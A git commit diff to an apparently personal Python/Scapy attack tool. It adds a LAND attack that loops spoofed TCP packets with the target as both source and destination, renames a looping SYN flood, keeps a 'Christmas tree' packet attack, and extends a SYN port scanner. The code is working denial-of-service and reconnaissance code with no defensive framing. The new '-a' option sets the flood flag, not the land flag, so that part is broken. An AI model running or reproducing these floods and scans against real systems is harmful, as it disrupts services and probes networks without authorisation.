4b91335b27527b6e77bdf83559dd58930c90d1ee
navin604 <55507003+navin604@users.noreply.github.com>
2023-03-05 22:15:17 -0800

    Added LAND Attack, renamed methods, added output for syn scan

--- main.py
+++ main.py
@@ -10,6 +10,7 @@ import socket
 # --Globals--
 flood = False
 scan = False
+land = False
 flags = []
 ports = "0"
 target = ""
@@ -20,7 +21,9 @@ def main():
     if scan:
         port_scan()
     elif flood:
-        send_flood()
+        syn_flood()
+    elif land:
+        land_attack()
     else:
         christmas_tree_attack()
 
@@ -34,11 +37,17 @@ def christmas_tree_attack():
         packets.append(packet)
     send(packets, loop=1, verbose=0)
     print("\n")
-    # Exit
-    sys.exit(0)
 
 
-def send_flood():
+def land_attack():
+    # Land attack
+    attack_flags = "".join(i for i in flags)
+    send(IP(dst=target, src=target, ttl=64)
+         /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
+         /Raw(b"X"*1024), loop=1, verbose=0)
+    print("\n")
+
+def syn_flood():
     print("In flood mode, no replies will be shown")
     attack_flags = "".join(i for i in flags)
     # Send packet in loop until ctrl+c is pressed
@@ -46,13 +55,18 @@ def send_flood():
          /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
          /Raw(b"X"*1024), loop=1, verbose=0)
     print("\n")
-    # Exit
-    sys.exit(0)
+
+
+def get_service(port):
+    try:
+        return socket.getservbyport(port)
+    except OSError:
+        return "\t"
+
 
 def port_scan():
     attack_flags = "".join(i for i in flags)
     no_response = []
-    recv_response = []
     ports_arr = []
     for i in range(int(ports.split("-")[0]), int(ports.split("-")[1])+1):
         ports_arr.append(i)
@@ -64,24 +78,16 @@ def port_scan():
         scan_response = sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags=attack_flags), verbose=0)
         if scan_response is not None:
             if scan_response.haslayer(TCP):
-                if scan_response[TCP].flags == 0x12:
+                if scan_response[TCP].flags == 18:
                     # Service running
-                    print(f"SA from {port}")
-                    try:
-                        print(socket.getservbyport(port))
-                    except OSError:
-                        print("No default service")
-                    recv_response.append(port)
+                    service = get_service(port)
+                    print(f"{port}\t{service}\t{scan_response[TCP].flags}\t{scan_response[IP].ttl}\t{scan_response[IP].id}\t{scan_response[TCP].window}\t{scan_response[IP].len}\n")
                     # Close connection
                     sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags="R"),
                         timeout=1, verbose=0)
-                elif scan_response[TCP].flags == 0x14:
+                elif scan_response[TCP].flags == 20:
                     # No service running
-                    print(f"RA from {port}")
-                    try:
-                        print(socket.getservbyport(port))
-                    except OSError:
-                        print("No default service")
+                    print(f"RA from {get_service(port)}")
             elif scan_response.haslayer(ICMP):
                 if scan_response[ICMP].type == 3 and scan_response[ICMP].code in [1, 2, 3, 9, 10, 13]:
                     # Silently dropped by firewall
@@ -108,9 +114,9 @@ wish stop a request, press ctrl + c"""
 
 
 def process_args():
-    global flood, target, scan, ports, flags
+    global flood, target, scan, ports, flags, land
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "h8:SFPUp:", ["help", "flood", "syn", "fin", "push", "urg", "destport=", "scan="])
+        opts, args = getopt.getopt(sys.argv[1:], "ha:8:SFPUp:", ["help", "flood", "syn", "fin", "push", "urg", "destport=", "scan="])
     except getopt.GetoptError as err:
         # print help information and exit:
         print(err)  # will print something like "option -a not recognized"
@@ -119,6 +125,8 @@ def process_args():
         if option in ("-h", "--help"):
             usage()
         elif option == "--flood":
+            flood = True
+        elif option == "-a":
             flood = True
         elif option in ("-S", "--syn"):
             flags.append("S")
